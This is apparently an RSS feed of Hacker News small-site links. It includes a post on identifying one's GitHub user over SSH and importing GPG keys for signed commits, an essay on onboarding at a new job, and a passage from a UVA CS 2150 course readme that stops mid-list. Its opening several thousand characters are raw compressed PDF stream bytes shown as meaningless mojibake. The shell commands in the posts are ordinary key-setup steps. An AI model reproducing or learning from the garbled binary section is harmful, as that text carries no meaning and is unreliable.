Eü®z™SopqŠ_ä-%"‘ê½žŸV\Íé þpëÇZô4Ò±š��¾‹E�-"›HP¥rùÃ(ùòKþGWÓrôu·vMŠ¶ÄóHD
UšÁ(©ð)â--çŸQprÎÆJ`Í6%ÜYY®7&gt;÷]²cí(F÷=A¶Û’]Ü­+ËNH"û	}úmF°s�Òüà�J§¤ÌwXóš¡AôÏÁ©hÛ«vö2�˜úêË€SSŸóúàx�ª¢0§¼ðÎˆV2'×�Ï¤…X—t¼qG?å»’ÜŽífæ4•ˆ,`Nªùº�ÚÍº*6˜?%}
1\¾…Yê²w»ÉŽ¾š¥XnaGý…åLóÏY#Tßësá"Ý‰!¦…ÿTì­ÈÀ%Ñ"�(þ5ÔôÉgR~vI£
?ªr�Ø_âQ‡wT9~æ/ÞR×®ïâe5Œv›q¨\&gt;ÚiŽ|·Ìkãº’¡‡µGª–Q±'“L­MÝ·B­ø*§5|£"Jœ›‘–”¤ ¸€ÐÊ5Žw
©&lt;‡šá”½_;Ä4ô£û(Á
Z¾–ÈxÍr.g´|Bá*±Ö/~âWžõîÔ&lt;ËŸFD-6±²’&gt;¼—nÈÊŒÃýHKZyÐ’ÚeB_5‰?ïi9þ²*ŠväÄ.:»%gÑ¬%8ÆàÐN‚“�Ä�ÑŽPðÓQO¤†-9ýëIœ8qô™O†1Ì^\’Š³ÉºŽý:ëâgù¯[²[ú¡ûœ‚Ño;¡àJ«	íªéÛCÍ¶Sßä3ÆùÞ�èÓ„›ùY±’#Ò¼õòKñTDH8.PÛ­zÂäû¶Ö÷i’Ç.ÒF7»
"ÏwŸ¬þïe‹�dJýéžÅAH°fa‘Ú³0�üõ‹�¬c`Ó9~¦Zö¹&lt;ÄÕ•\	Uˆ�Ïææ×Ùä)‚_|Jz²{DCç?L¹Üw…¶xRËN„ûÀ
4‡£kOÑî»|o2Ã\”ôUG®?Ùe®—J	‰ÐØäË@öµ»�Hê2=Â¼•Øv-æ’�Fæ#Ü®Iò³ÇÌÆ¶Ûó§–üªÜÈ‹òŒÀ…ò¿„iÙºá]|@‡6‹ïÖ.ÖµÈÆq~ù
gâ/Å±~ç3GAR�&nbsp;ÜÉó¿ó&gt;'ù2gHÑž¼6H
g4ð¯/©msQ«_à­�®:íÄŸRü&nbsp;/–}'
»&lt;£ë¯`(ZÈ¼4ÎÜw0ù.ÛÛ]˜Û4Ê¢môU�õ?Qàù¾Î&amp;Aè¹~ˆüöíÛ‹ñßÞñOjl”¹
endstream
endobj
183 0 obj
&lt;&lt; /Filter /FlateDecode /Length1 1421 /Length2 6662 /Length3 0 /Length 7636 &gt;&gt;
stream
xÚ�uT”m×.-Ž 
ÒCwwJJKwè03À303tw
ˆ4ˆÒ"RJŠ - ¢´€t‡ÿ¨ïû½ÿû�³Ö9ëYkžç¾vÜ{ßûºîá`10P† ì¡÷p´€ˆ&nbsp;°,PUÏØR(,,&amp;(,,
àà0�¡]¡Á3(CÀeÿ—ƒ*
Bc05ã§‡€µ=]�"b@IY)Yaa&nbsp;¨°°ÌßŽ¤,P
äƒõ�Ú8àPE¸û"aŽNhÌ6¹Á&lt;@)þßá@e7(Á�z ´Ô
³#ä
4F€aP´ï¿RpË;¡Ñî²BBÞÞÞ‚ 7” é¨ÈÃô†¡�€FPé…5¼rƒþéLÀ4q‚¡þàÆ´7	bW
Ga"&lt;á(ˆÙh¬¥Ôw‡Âÿ8ëþqàþu6@A‘ÿ¤û+úW"üw0F¸¹ƒà¾0¸#Ðæ
êßÓDû&nbsp;ù� 8ä—#È…ÀÄƒ¼@0W�=Æáwå à=eC Óà_í¡ÀH˜;%ˆ‚¹þjQèWÌ)«Ã!ª77(�üªO
†„‚1Çî+ôg².p„7Üÿ¯…qøÕÄÓ]Èóð„j©ýå‚�ÿ`ŽP4PBXFRR\õB}ÀNB¿Ò›øºCE~Á˜ýÝî@LÐ@˜óø£@^P é	
ôÿß†¯""@ŒÚCapÀ?Ù10ÔáÏ3|$Ìh-ŒážPø×óŸ/[½ ¸«ï?î¿ç+d¦fn&nbsp;lÂ÷§ãÿØTT&gt;@1a&nbsp;€Œ„PDDZ(%%üwì¯2„ÿ‰Õ‚; €2ªÅÓß{ýEî¿ÄÁüw®ûk¡@îHn#,!ÆüˆüSýwÈÿ�á¿²ü¿HþßÝótuýmæþmÿ?Ì 7˜«ï_Òz¢1ÐC`dÿoWsèÑêA!0O·ÿ¶j¡A!(Ã1dÿƒÃP÷`&gt;Pˆ
vúC™?¸é/©¹ÂàP
öënÁD	ÿ—
£/°æþ@axùÛÅÈçßûªÃÁÈ/�‰JHAH$È Œ¡“(fÞþ"AB&nbsp;&gt;¿™„#Ð˜ ¦Ç@&nbsp;	ø5V1&nbsp;…é†rÁLÁé—ñ7."*‚€1Çñ&amp;ú7±wý
ÿ«°'‰ÑäoÊ`
ý{ýû€B}&nbsp;`À§)X.Â¹&gt;¢í´V™Þ[`åÁ—¯±É–½1hÎéçþNº7²5Æ=TBªîfÌ”E�MÐóþ8ö±y›º�®ù�¥Þ»¤²+�?pvðÖÊAÐ9ŽHeÄ.‘í&lt;6d$yh�gÍõÄ|ê2RªKl­zµèªµf%³	t“²¤Ó£)çulâÄ[²°E¿·´!M$GZgzšh™Ž\áÄÃOTÚhÏ|—¬³ÞÏÏ¿ËíëÍÛ/Ðé®‘¬Š¢&nbsp;¥ôÓfÉLé§¥zœ«ÝŒÂâT‘8V-KKf¥}áÅ¹€êíþd-Óòf
¢Í½ñhçñá½æ{,xJôÖ3ãÚ�@ûÝÞúyý›.¡ä"mÛ1ùà”óùí
î&amp;‚%@‡dbÀ€¸^QbÛÁ¢¸ƒÃcÅ~UBâ|:¹Ù¡ŸÖ·ÎFíÊŽ�%¶àrÙŠ�ªÏ‰9±~ÊÝ'^&gt;uG$µQñw�,&nbsp;&amp;Q5dœô­AÓ•Ÿ:�ë†h	nûÊY	Þ?ôiª K7‹Ö•w÷pc8{'¬wC
ñ|Y¿ÅvŸˆmÎ1c­&amp;âéJÀÙŒClºD¨wË\ÕœéDÂ�K*ß¦ô­·s&gt;_ùÐWb£�Ðâ5ïœó"±yâ2=øcðVºBŸÐ×	V«Fž‚4‰ëj¦Ù6ÜÀn»‹iÁw¿û�vÏÜŠx²�ô«ÙÜñÀ~ $ž“'n™&gt;å[x‘@òá�èZÉ2~qV”ÃôU~w�o°c—2yIG4·
Aî}´ß#œúÇ%ÇE}Âc@¿oš]N8$˜9ìõ…VÇá‡9%‹ö*ÊKÿÂ©=ÿZóù�ê`Ý—�Ì
'ô
Q+%?ß›ðá
ÃK&amp;"ÙrÐd‰ŸÎ–¨’pÔ7ÉË¬=wá/òáûf£NÚ82â¹Ä�WQ8Y¸î)œ)Ü[nq«R¹Ÿð­ÃÜXìR7Á�qÖ0Ö[³ÝûBªgÖ4™.¯î"ïí‚’ãÓX×Ð¶w’e…«ùå¼õä´o›2Û6†ÁÉÌø¹(Í@ùÂá{N)E½b¶r­N
ÞG×IÌ�õöGgnÙ±~%1.Ã¤tEâ²_SiÈŽ¥F¢$�	ÃvT$Û©'ch‡/?á…Ê_x|exKÇ•xBñÕ-¸&gt;ÄUÊWØ‘½á{¨œ¦é;Á3×2^Žtañq¾k.oKiG1"[»‡“DÃd!ïéÝ5ï²û†7„ôˆ1;^B�y[ÉL²’Ùz?³;oÈD~Tí1cVýbœ(,è„¼ã¬%A�pU	y–þŽ
ßHrö¤Çm2{9&nbsp;€¦2Fjã�Èß�µs:Ñ“8�k&nbsp;À�l&amp;%/ŸÐXÓ¦Ì„¯µši,õa“‡hÏ’ÕÉ{¯…îÁery�õBPxÖò·ïÜé±µEo&nbsp;
qó
=ÏüŸj–?!Ê'¯üô”¥tÍ½b-B¯œ@Âôƒ'?–b,¬ÛÚ1ÔTÉiH*hÓ²x¬s†eXb$‰¼eõ9Ží²pÓ¯ïÜ¤û�E&gt;š×—ÚVe&amp;ÿ¥ÏÅ&nbsp;p©S®»UÇ‡Sæ&lt;ð!á\IicQÒ×2¯›š!Ù"¼I8o“‘+WÑ\a_qíÚ%§FÌ‡;ÓÈ·‰m,Ýö,�î¾ðmÍfÑJ@8òSÈ¶tæŽì§~–5Õ[ãjâÈkÐ5m/{pB:ƒ±ªti³o–ƒóîO4%¬[…ù�‰XŸÈ‰/‡ºÛ­7Ýßq¿(÷PQ’“pÍÄžÎQq=Š^ø�Lf‘rÖóÈ¥1&nbsp;hUÏ0­Ï&nbsp;1dcöª¶G�^&lt;¦Ó.‰¤}½e,3~QágÇ¼ÕÏÃ8EpwlQ@¦öz;ÏWïhvkæ•�|³Ç&amp;d5§’Œ1€W½
ŸŸ=Å»Ä]ZâMú¶Bs¯ÒUGzŒî†-{¤z¡ÛGw¥ÞBß&gt;É69`o�&amp;¯<k^n¢»r,jÔ³]áðgt¤è(Í´|fû1ª$ö 7‡Â<÷Õ`ÿ—}µçeÓüœõn,}ŸÂËbffé¶="~ÚëðôM:ÄÊK/ðƒ¤Ì''{ÓUÒ|NÃÆðôÔD%Ç.–‹è|kY¯dó&quot;‡Y¢ÈXÕ–€rnlûÙ]\X­Yæª�_'ã¨ËP&nbsp;Uy°²ÆÁR<M‹óç³Ðå­åÅ¨" £ãpæšêÝwn»œiõõ}¶›ÑÅpóð°;ýàÂåœm·%y¯~n?Þ8v›®="">¾.&gt;™«³Ü{FÎÞ730W�·¯F­èýÉè2´?Ä*ô:�rEºgé­ªtN–ç4�õ¹ºäI¶WÞ]¥ŽmA§yì�s’—Z(úRb·^i“7:=ì&lt;)‹ã]áÜ×·,wñ½•¾uwˆ9Y÷˜¦öµ´ßd‹ê&lt;Œ8&amp;J¶g5x:X[éÖ?Ž™G6?üG&amp;ÈP^è
cÇõ.¹{çGm,µ2&nbsp;�ý¼¬2‘¬J¿‹&nbsp;Ii
¬8ž¬.z{nJ+Çö¥Ñr'ß»änÝLÙ›"¨›ôú0s&nbsp;îüî¥ƒ¼Iêyö½T<h®f-×±!ég›.o�égÏæÉž� {@½s"vay;="" *‚ŸÈ™–x‰xŒºÙeÞä-‰�}vù¢:c¶ËÂój|¹¢võÍ+¿¦{¬="" s­¬Ô="" ¸ÆÌÄ¾»ÃŒo:ø³f¯ù÷l#ÂèÓc="">p/á)Šx0qŠº1Äí»S‹jQ3ê\å«pÍyk„÷ÑE?lF¦j¥­R&amp;�Z_ü(?ÐuþÈ½þÃ‡Àž
Z�nÐ5æÖÇ½Sßš!m{j‹–Î]e1e�ÞˆyB¨R\„#ñ£î:K´;¹‰ŽHë{Ž6A*Ü¼êdì•Ò,ˆô½l©gÕSÚOßªCñ×Ÿ€¥R£|gè(fN’³@‹†éúÏ¸™â¯Iò}Žã]Þz@è
¥ÎÀ^{€ÒÇ4‡„¶mþ¯RªäWGˆ×i7u,F™¥î‘ÛÓq…µÁ“`¿œOþäÝæDÖ²/ÂŒJXÒ´…ûpÜÁ"à§*=f:¸f,9„&amp;U]«®á=‘–/‹IµpÈ.âc\_~÷å�½9ñrL;ô34
Ò¶)©:ºÀ�RmurþUWfâ�­¥‡âó`ZŸ<f¡¼´õ‚ ýÏÒ¹5ål¬ŠÙßÎc*Ë�êõc¸(îpêÑxæ]¾‡˜_v7±Ðçm�*ý="" g‰Á="" êób+µèèðÔxÚòhýåÙl�ÿ-ŒaÑ(³ÇrdÙˆfò“'îÏoï‰†¦="" k6};eç¼[ÜŠoé|h¹¦="" Àk:–«yø3·ª2jœÄr‘azùå±¤Ùæ§ãtzlÕùÒtya#æo‘��o(n="©=UÕ!Ý#Õ?L¸GÕ3Ï%—7�n$R/ˆÍWê&quot;Ø¬¹Z(—ÞÚ?JRXÇ6V,wŸ" s_*Šc"o™�l{ÀÆk-÷ôÛÚ®æÉùkÇªËb“ó"¦Àå±íhß¡×edü‹”dùoñÍíxz‹…s="" y†ˆááè²�h©úy×wÂoj¥­ãÃÁ@¥çÂøi!å&á7ˆÒªj¥“¯pd�g‰£Ëmsõjórgãpê="">épÝfù&gt;õp?¤óL/#Úf­¹P±ñˆNèíu›ƒÆ‘ÓôRGLr]žaH~"1yÕõg¿"ÅËÁ—Ãš�)ÙEÇÖð0‚'­¸æ
ýxsU…A(UÁñ,¥ZÓó¶:=Š¡�|Ï¾D;7¬:b©b5¹Ã­æ¢m¾”úÕÚ!pFš%ÆäM;¾ÑŒU�É3Ù˜bþð®aUÄ:gM©ïý3bX7¬GÕ�rRíœpø·/µ&nbsp;…	œä,pöÐ«3E[ïÝŽv¬UKœÝj~q3®åSWì‘0{´ïKpHh%HÃ×RYÁ#¦Ì‚0OJÇ$æîW»Oú'ÜËâ¢ÌÓp÷=õz}Ø¢P“¯ŸôZ®¤Ž¹]Œ¤Wù®2êÛ*ÝÔhºPEwË»’ÌFz#Ÿ�H¥j²Auð%ót#&nbsp;Ÿb'“H‰óUüØucÊ&lt;5Lã2—àï._›/Ö�¾¨›lËïz](¨&lt;ƒÏ"KY8Q«ò„¯²¾žäzÞ�˜8à1&nbsp;:¶\/¶ÏyUÝÿ³BÃø"qü›þ…</f¡¼´õ‚></h®f-×±!ég›.o�égïæéž�></k^n¢»r,jô³]áðgt¤è(í´|fû1ª$ö></yù§õhnvbªgb³âó></a”o�è_vÿø¹`3�t´,5bpfÿr1˜þñ“ª7w·‘ûíé¯müyöy@2�ü�—i*a^ür+cîùh=6škîûað³5º�ù™ò¾²></o¨n€çøð0¨ç¾xýi±.üo-öt[lœ¹‹;—ùôáq~µmxt7œøl¹í¸5];¼&h^ã%s?õðëóà%ntþ2ì}5¼=a®_z></ulš²-ûbhag·=©óñ~yv%«þy.í»1ÿ÷™êy–}í6¶o«“t_»º¼æ#´à¼dòé¨úu÷></mƒa8:,#è-�‘<�sˆ></wtó€></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://damonmccoy.com/papers/ecrime2019.pdf">https://damonmccoy.com/papers/ecrime2019.pdf</a></em></p>]]>
            </description>
            <link>https://damonmccoy.com/papers/ecrime2019.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25030329</guid>
            <pubDate>Mon, 09 Nov 2020 00:23:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[GitHub Whoami via SSH]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25030301">thread link</a>) | @menduz
<br/>
November 8, 2020 | https://menduz.com/posts/2020.11.08 | <a href="https://web.archive.org/web/*/https://menduz.com/posts/2020.11.08">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>There is a very easy way to know know which Github user is associated with your SSH key.<!--more--> 
Executing <code>ssh -T <a href="https://menduz.com/cdn-cgi/l/email-protection" data-cfemail="4b2c223f0b2c223f233e2965282426">[email&nbsp;protected]</a></code>, you will receive a greeting with your username.</p>

<div><div><pre><code>❭ ssh <span>-T</span> <a href="https://menduz.com/cdn-cgi/l/email-protection" data-cfemail="2f48465b6f48465b475a4d014c4042">[email&nbsp;protected]</a>
Hi menduz! Youve successfully authenticated, but GitHub does not provide shell access.
</code></pre></div></div>

<p>To extract the username we can run <code>sed</code> over the response.</p>



<h2 id="importing-gpg-keys">Importing GPG keys</h2>

<p>I use my YubiKey to store both my GPG and SSH. But having the SSH working out of the box is way easier than GPG, the last requires the machine to know the public key before it can be used. And it can be either downloaded from a key server, plain .asc files, or like in my case: download it from my Github profile.</p>

<p>To do so, I leverage the <code>https://github.com/{username}.gpg</code> function.</p>

<p>Since we now know the username associated with the SSH in the YubiKey (the previous step), we can get the GPG keys like this:</p>

<div><div><pre><code>❭ <span># this step may require you to touch the YubiKey</span>
❭ <span>username</span><span>=</span><span>$(</span>ssh <span>-T</span> <a href="https://menduz.com/cdn-cgi/l/email-protection" data-cfemail="f4939d80b4939d809c8196da979b99">[email&nbsp;protected]</a> 2&gt;&amp;1 | <span>sed</span> <span>'s/^Hi //'</span> | <span>sed</span> <span>'s/\! .*//'</span><span>)</span>
❭ curl <span>--silent</span> <span>"https://github.com/</span><span>${</span><span>username</span><span>}</span><span>.gpg"</span> | gpg <span>--import</span>
</code></pre></div></div>

<p>Check it works running <code>gpg --card-status</code> and search for the email in the “General key info” section, it must match your GPG’s. If it doesn’t show up, make sure you are importing the same keys present in the card.</p>

<div><div><pre><code>❭ gpg <span>--card-status</span> | <span>grep</span> <span>"General key info"</span>
General key info..: pub  ed25519/3ABC123401923E0A 2020-11-08 Agustin Mendez &lt;<a href="https://menduz.com/cdn-cgi/l/email-protection" data-cfemail="1861776d6a587d75797174367b7775">[email&nbsp;protected]</a>&gt;
</code></pre></div></div>

<h2 id="setting-up-git">Setting up Git</h2>

<p>Now that we already have our GPG and SSH working, we must configure Git to use the GPG and the mail.</p>

<p>To do so, the email address from the GPG will be used (which is a requirement for Github).</p>

<div><div><pre><code>
<span># Read email from the --card-status</span>
<span>CARD_MAIL</span><span>=</span><span>$(</span>gpg <span>--card-status</span> | <span>grep</span> <span>-Po</span> <span>--color</span><span>=</span>never <span>"(?&lt;=&lt;).*(?=&gt;)"</span><span>)</span>

<span>if</span> <span>[[</span> <span>$?</span> <span>==</span> 0 <span>]]</span><span>;</span> <span>then
  </span><span>echo</span> <span>"&gt; Using mail: </span><span>${</span><span>CARD_MAIL</span><span>}</span><span>"</span>
  <span>CARD_NAME</span><span>=</span><span>$(</span>gpg <span>--card-status</span> | <span>grep</span> <span>-Po</span> <span>--color</span><span>=</span>never <span>"(?&lt;=[0-9]{4}-[0-9]{2}-[0-9]{2} ).*(?= &lt;</span><span>${</span><span>CARD_MAIL</span><span>}</span><span>)"</span><span>)</span>

  <span>if</span> <span>[[</span> <span>$?</span> <span>!=</span> 0 <span>]]</span><span>;</span> <span>then
    </span><span>echo</span> <span>"&gt; ! Cannot find CARD_NAME."</span>
    <span>echo</span> <span>"&gt; FAILED!"</span>
  <span>else
    </span><span>echo</span> <span>"&gt; Using name: </span><span>${</span><span>CARD_NAME</span><span>}</span><span>"</span>
    <span>KEY_ID</span><span>=</span><span>$(</span>gpg <span>--keyid-format</span> none <span>--list-key</span> <span>"</span><span>${</span><span>CARD_MAIL</span><span>}</span><span>"</span> | <span>grep</span> <span>-Po</span> <span>"[A-F0-9]{40}"</span><span>)</span>
    <span>if</span> <span>[[</span> <span>$?</span> <span>==</span> 0 <span>]]</span><span>;</span> <span>then
      </span><span>echo</span> <span>"&gt; Using key:  </span><span>${</span><span>KEY_ID</span><span>}</span><span>"</span>
      git config <span>--global</span> user.name <span>"</span><span>${</span><span>CARD_NAME</span><span>}</span><span>"</span>
      git config <span>--global</span> user.email <span>"</span><span>${</span><span>CARD_MAIL</span><span>}</span><span>"</span>
      git config <span>--global</span> commit.gpgsign <span>true
      </span>git config <span>--global</span> user.signingkey <span>"</span><span>${</span><span>KEY_ID</span><span>}</span><span>"</span>
      <span># git config --global url."ssh://<a href="https://menduz.com/cdn-cgi/l/email-protection" data-cfemail="0f68667b4f68667b677a6d216c6062">[email&nbsp;protected]</a>/".insteadOf "https://github.com/"</span>

      <span>echo</span> <span>"&gt; SUCCESS!"</span>
    <span>else
      </span><span>echo</span> <span>"&gt; ! Cannot find KEY_ID"</span>
      <span>echo</span> <span>"&gt; FAILED!"</span>
    <span>fi
  fi
else
  </span><span>echo</span> <span>"&gt; ! No known yubikey was detected."</span>
  <span>echo</span> <span>"&gt; FAILED!"</span>
<span>fi</span>
</code></pre></div></div>



<p>Did you know you are sending your identities every time you connect to an ssh server?</p>

<p>Be careful to not leak your keys to every place you want to connect to.</p>

<p>To do so, create an identity for each site you want to connect to and add the following lines to your <code>~/.ssh/config</code> file:</p>

<div><div><pre><code>IdentitiesOnly <span>yes

</span>Host github.com
  IdentityFile ~/.ssh/id_rsa_yubikey.pub
</code></pre></div></div>

<p>To get the public key from your SSH in the YubiKey run:</p>

<div><div><pre><code>ssh-add <span>-L</span> | <span>grep</span> <span>"cardno"</span> <span>&gt;</span> ~/.ssh/id_rsa_yubikey.pub
</code></pre></div></div>

<p>That is part of my https://menduz.com/bootstrap.sh script, used every time I set up a new machine or when I think that my machine was somehow compromised.</p>
 
  </div></div>]]>
            </description>
            <link>https://menduz.com/posts/2020.11.08</link>
            <guid isPermaLink="false">hacker-news-small-sites-25030301</guid>
            <pubDate>Mon, 09 Nov 2020 00:17:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Howard Marks Memos [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25030208">thread link</a>) | @tosh
<br/>
November 8, 2020 | https://austenallred.com/assets/all-howard-marks-memos.pdf | <a href="https://web.archive.org/web/*/https://austenallred.com/assets/all-howard-marks-memos.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://austenallred.com/assets/all-howard-marks-memos.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25030208</guid>
            <pubDate>Sun, 08 Nov 2020 23:56:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Future of File Utilities: Encryption, Hashing and Compression in the Browser]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25030125">thread link</a>) | @securemonkey
<br/>
November 8, 2020 | https://blog.secure-monkey.com/the-future-of-file-utilities-encryption-hashing-and-compression-in-the-browser/ | <a href="https://web.archive.org/web/*/https://blog.secure-monkey.com/the-future-of-file-utilities-encryption-hashing-and-compression-in-the-browser/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://blog.secure-monkey.com/the-future-of-file-utilities-encryption-hashing-and-compression-in-the-browser/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25030125</guid>
            <pubDate>Sun, 08 Nov 2020 23:40:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Onboarding is not a one way street]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25030054">thread link</a>) | @bored_hacker
<br/>
November 8, 2020 | https://boredhacking.com/onboarding-is-not-a-one-way-street/ | <a href="https://web.archive.org/web/*/https://boredhacking.com/onboarding-is-not-a-one-way-street/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><header><h3><a href="https://boredhacking.com/">Bored Hacking</a></h3></header><main><p>November 08, 2020<!-- --> | <b>4<!-- --> min read</b></p><div><p>Onboarding can be a very hectic and stressful time when you are starting a new job. New coworkers to meet, new codebases to learn, new languages to learn, new technologies, new processes, and the list can go on and on. Good onboarding materials and processes can go a long way when you’re first starting out. However, it shouldn’t just be a one way street. Onboarding should be a collaborative and incremental process that every new hire(and employee) actively contributes to. Things change from onboarding class to onboarding class, especially in a fast moving startup. It is therefore not only up to the existing members but also the new hires to contribute to the onboarding experience and documentation to keep it up to date and make it better overtime. Here are some recommendations for making onboarding not only productive for you but also better for future new hires.</p>
<h2>Take Your Time to Onboard</h2>
<p>Onboarding isn’t a race to the finish line. It can feel like you need to onboard as quickly as possible and be productive right away. However, you have to remember that Rome wasn’t built in a day and this time is important to build a good foundation for the rest of your time at the company. You don’t want to jump in before you’re ready and struggle to keep up. Take your time to properly onboard, and learn as much as you can during this time. Your team will be understanding that you are onboarding and shouldn’t feel like you need to be productive from day 1. Although there is generally a set time period for new hires to still be onboarding, the first month or two generally depending on your company. Take full advantage of your expected onboarding period. When you run into something you don’t know or haven’t seen before, take the time to really dig into it and learn it. Do your own research or ask teammates about it and make sure you fully understand it. Once again, this will pay off in the future and help you compound your knowledge as you continue to learn and work at the company.</p>
<h2>Write and Update Documentation</h2>
<p>As you are onboarding hopefully there is already some documentation on how to at the very least setup local development. Depending on your company, you may also have documentation on team specific information, common tasks, etc. Find out what your company uses to store documentation(Google Drive, Github, Notion, Confluence, Dropbox Paper, etc.) and look through it for even more documents. As you go through this documentation, if there’s anything that doesn’t make sense or is outdated make sure to update the documentation. And if you realize there isn’t any documentation for something you encountered then you should write it! Anything you do while onboarding that didn’t have clear directions or documentation, feel free to write it up yourself. Even once you are done onboarding, you should continue this. Every little improvement will benefit someone else down the road and make them productive quicker, multiplying your effect and increasing overall productivity.</p>
<h2>Take Notes During Onboarding</h2>
<p>Take notes of things that went well during your onboarding and things that could have gone better. These will be important for improving the situation for the next hire(s). Take these notes to your manager and talk through the good and bad. This will help the organization understand what they are doing well and what they can do to make it better for the next hire on your team. Your manager will want to make sure they are doing everything they can to help you onboard better and improve the situation for the future.</p>
<h2>Ask Questions</h2>
<p>Asking questions and getting good answers is incredibly important during onboarding. You may get blocked often while onboarding because there are a lot of unknowns and that’s okay. But don’t wait too long to unblock yourself. One big thing to remember is, you should never hesitate to reach out to someone because they seem too busy. They may be busy but they will normally make the time to help onboard new people. Although not all onboarding buddies may be okay with constant interruptions, it is reasonable that you should try and limit their context shifting. Therefore, setup time to talk with your onboarding buddy or teammate. Setting up time can help limit this but also ensure you get your questions answered. At first this should probably be a set time daily for the first week, but as you continue to onboard it can be less often.</p>
<h2>Good Onboarding and Helping Out New Hires is a 10X Situation</h2>
<p>The 10x engineer is often talked about in tech and seen as a unicorn of sorts. For those not familiar, it was commonly thought that a 10x engineer performed 10 times as efficiently as other engineers, performing the work of 10 engineers. However, I don’t think that a 10x engineer should only be more efficient but I think 10x engineers are engineers who help 10X the learning of other engineers as well. A 10x engineer helps their whole team be more efficient by teaching and mentoring them. This applies directly to onboarding and new hires. The faster new hires onboard the faster they can be productive. Spreading information to more people makes everyone better and creates a cycle of spreading information, which can lead not only to a 10x situation but a 100x situation where multiple people within your org are increasing their knowledge and productivity by 10x. The real “unicorn” engineers are the ones who lift up the whole organization or team, and onboarding is a key component of that. Everyone should realize the importance of a good onboarding period for new hires and how it can help the organization as a whole.</p></div><hr><ul><li><a rel="prev" href="https://boredhacking.com/starting-a-new-elixir-project/">Starting a new Elixir Project</a></li><li></li></ul></main></div></div>]]>
            </description>
            <link>https://boredhacking.com/onboarding-is-not-a-one-way-street/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25030054</guid>
            <pubDate>Sun, 08 Nov 2020 23:26:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CS 2150: Program and Data Representation]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25029751">thread link</a>) | @swatson741
<br/>
November 8, 2020 | https://aaronbloomfield.github.io/pdr/readme.html | <a href="https://web.archive.org/web/*/https://aaronbloomfield.github.io/pdr/readme.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

<p><a href="#introduction">Introduction</a> | <a href="#contents">Repository contents</a> | <a href="#contributing">Contributing to this repository</a> | <a href="#description">Course description</a> | <a href="#markdown">Markdown</a> | <a href="#sourcecode">Source code</a> | <a href="#license">License</a></p>
<h2 id="introduction"><a name="introduction"></a>Introduction</h2>
<p>This repository contains the materials for the course entitled “CS 2150: Program and Data Representation” in the <a href="http://www.cs.virginia.edu/">Computer Science Department</a> at the <a href="http://www.virginia.edu/">University of Virginia</a>. It contains all of the slides, labs, exams, etc., used throughout the course. The course description is <a href="#description">below</a>. The github repository for this course is at <a href="https://github.com/uva-cs/pdr">https://github.com/uva-cs/pdr</a>. It can be viewed online at <a href="http://uva-cs.github.io/pdr/">http://uva-cs.github.io/pdr/</a>.</p>
<p>Students <em>currently</em> in the course should view the <a href="https://aaronbloomfield.github.io/pdr/uva/index.html">uva/index.html</a> (<a href="https://aaronbloomfield.github.io/pdr/uva/index.md">md</a>) file in the <strong>cloned</strong> repository (i.e., don’t try to view it on github.com); current students may also want to view the <a href="https://aaronbloomfield.github.io/pdr/uva/daily-announcements.html#/">daily announcements</a>. Note that many of the course materials are modified right before they are needed – for example, this repository will be updated right before the semester starts.</p>
<p>Students who were previously in the course may want to view the current version, or you can view the version from your semester. All semester versions are tagged with an end-of-semester tag of the form “year-semester”. For example, the spring 2014 semester was tagged as <code>2014-spring</code>. To obtain a specific tag, you can enter <code>git checkout tags/2014-spring</code> in an already cloned repository.</p>
<p>The primary authors of this repository are <a href="http://www.cs.virginia.edu/~mrf8t">Mark Floryan</a> (<a href="mailto:mrf8t@cs.virginia.edu">mrf8t@cs.virginia.edu</a>), <a href="http://www.cs.virginia.edu/~nn4pj">Rich Nguyen</a> (<a href="mailto:nn4pj@virginia.edu">nn4pj@virginia.edu</a>), and <a href="http://www.cs.virginia.edu/~asb">Aaron Bloomfield</a> (<a href="mailto:aaron@virginia.edu">aaron@virginia.edu</a>). Many students and faculty have worked on this course material over the years.</p>
<h2 id="repository-contents"><a name="contents"></a>Repository Contents</h2>
<p><strong>Note that the links below will not work correctly if you are viewing this online at github.com – you will need to clone (download) the repository first</strong></p>
<ul>
<li><a href="https://aaronbloomfield.github.io/pdr/book/index.html">book</a> (<a href="https://aaronbloomfield.github.io/pdr/book/index.md">md</a>): the beginnings of a textbook to be used for this course. It is written using LaTeX.</li>
<li><a href="https://aaronbloomfield.github.io/pdr/docs/index.html">docs</a> (<a href="https://aaronbloomfield.github.io/pdr/docs/index.md">md</a>): a series of useful documents that are not labs or tutorials.</li>
<li><a href="https://aaronbloomfield.github.io/pdr/uva/index.html">uva</a> (<a href="https://aaronbloomfield.github.io/pdr/uva/index.md">md</a>): the materials that are specific to CS 2150 as taught at the University of Virginia, such as daily announcements, due dates, etc.</li>
<li><a href="https://aaronbloomfield.github.io/pdr/exams/index.html">exams</a> (<a href="https://aaronbloomfield.github.io/pdr/exams/index.md">md</a>): past exams for the course; there are two midterms and a final for each semester.</li>
